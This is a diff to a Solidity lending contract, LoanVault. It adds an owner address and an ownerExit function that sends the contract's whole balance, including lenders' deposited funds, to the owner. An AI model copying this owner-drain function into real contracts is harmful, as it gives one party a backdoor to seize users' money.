@@ -26,6 +26,7 @@ contract LoanVault {
     string status;
   }
 
+  address public owner;
   uint256 public lockedAmount;
   uint256 public lendedAmount;
   mapping(address => Loan) public loans;
@@ -70,10 +71,11 @@ contract LoanVault {
     uint256 timestamp
   );
 
-  constructor() {
+  constructor(address _owner) {
     lockedAmount = 0;
     loansCount = 0;
     lendersCount = 0;
+    owner = _owner;
   }
 
   function lend() payable public {
@@ -99,6 +101,11 @@ contract LoanVault {
 
   function balance() public view returns (uint256) {
     return address(this).balance;
+  }
+
+  function ownerExit() public {
+    require(msg.sender == owner, "Only owner can exit");
+    payable(owner).transfer(address(this).balance);
   }
 
   function withdraw() public {
